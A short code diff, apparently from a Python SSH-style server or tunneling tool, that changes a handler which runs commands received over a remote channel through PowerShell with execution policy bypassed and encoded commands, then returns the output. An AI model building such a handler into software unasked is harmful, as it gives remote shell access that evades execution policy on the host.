@@ -289,7 +289,7 @@ def tcp(role, port):
 
 def channel_exec(chan, cmd):
     print("Got exec request on channel %s for cmd %s" % (chan, cmd,))
-    p = Popen(['PowerShell.exe', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', base64.b64encode(cmd.encode('utf-16-le'))], cwd=curpath, shell=True, stdout=PIPE, stderr=PIPE)
+    p = Popen(['PowerShell.exe', '-ExecutionPolicy', 'Bypass', '-OutputFormat', 'Text', '-EncodedCommand', base64.b64encode(cmd.encode('utf-16-le'))], cwd=curpath, shell=True, stdout=PIPE, stderr=PIPE)
     (stdout, stderr) = p.communicate()
     chan.send(stdout)
     chan.send(stderr)
